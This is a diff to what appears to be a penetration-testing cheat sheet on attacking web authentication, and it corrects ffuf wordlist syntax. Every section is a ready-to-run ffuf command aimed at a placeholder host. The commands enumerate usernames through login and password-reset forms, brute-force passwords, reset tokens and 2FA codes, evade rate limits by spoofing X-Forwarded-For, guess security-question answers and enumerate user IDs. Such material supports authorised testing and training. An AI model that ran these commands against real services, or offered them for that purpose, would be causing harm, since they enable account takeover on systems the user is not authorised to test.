@@ -11,7 +11,7 @@
 ### Exploit - ffuf User Enumeration (Login Form)
 
 ```bash
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
      -u http://TARGET/index.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -25,7 +25,7 @@ Password reset endpoints often reveal valid usernames with different error messa
 
 ```bash
 # Generic password reset enumeration
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
      -u http://TARGET/reset-password \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -33,7 +33,7 @@ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
      -fr "user not found"
 
 # CMS-specific (Backdrop/Drupal style)
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
      -u "http://TARGET/?q=user/password" \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -72,7 +72,7 @@ awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wor
 ### Exploit - ffuf Password Brute Force
 
 ```bash
-ffuf -w ./custom_wordlist.txt \
+ffuf -w ./custom_wordlist.txt:FUZZ \
      -u http://TARGET/index.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -102,7 +102,7 @@ seq -w 0 999999 > tokens.txt
 ### Exploit - ffuf Reset Token Brute Force
 
 ```bash
-ffuf -w ./tokens.txt \
+ffuf -w ./tokens.txt:FUZZ \
      -u "http://TARGET/reset_password.php?token=FUZZ" \
      -fr "The provided token is invalid"
 ```
@@ -123,7 +123,7 @@ ffuf -w ./tokens.txt \
 seq -w 0 9999 > tokens.txt
 
 # Brute force (include session cookie!)
-ffuf -w ./tokens.txt \
+ffuf -w ./tokens.txt:FUZZ \
      -u http://TARGET/2fa.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -144,13 +144,13 @@ ffuf -w ./tokens.txt \
 
 ```bash
 # Add random IP to each request
-ffuf -w passwords.txt \
+ffuf -w passwords.txt:FUZZ \
+     -w <(for i in $(seq 1 10000); do echo "10.0.0.$((RANDOM % 255))"; done):FUZZ2 \
      -u http://TARGET/login \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-Forwarded-For: FUZZ2" \
-     -d "username=admin&password=FUZZ" \
-     -w <(for i in $(seq 1 10000); do echo "10.0.0.$((RANDOM % 255))"; done):FUZZ2
+     -d "username=admin&password=FUZZ"
 ```
 
 ---
@@ -174,7 +174,7 @@ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
 ### Exploit - ffuf Security Question Brute Force
 
 ```bash
-ffuf -w ./city_wordlist.txt \
+ffuf -w ./city_wordlist.txt:FUZZ \
      -u http://TARGET/security_question.php \
      -X POST \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -241,7 +241,7 @@ curl -i http://TARGET/admin.php
 curl "http://TARGET/admin.php?user_id=1"
 
 # Brute force user IDs
-ffuf -w <(seq 1 1000) \
+ffuf -w <(seq 1 1000):FUZZ \
      -u "http://TARGET/admin.php?user_id=FUZZ" \
      -fr "Could not load"
 ```
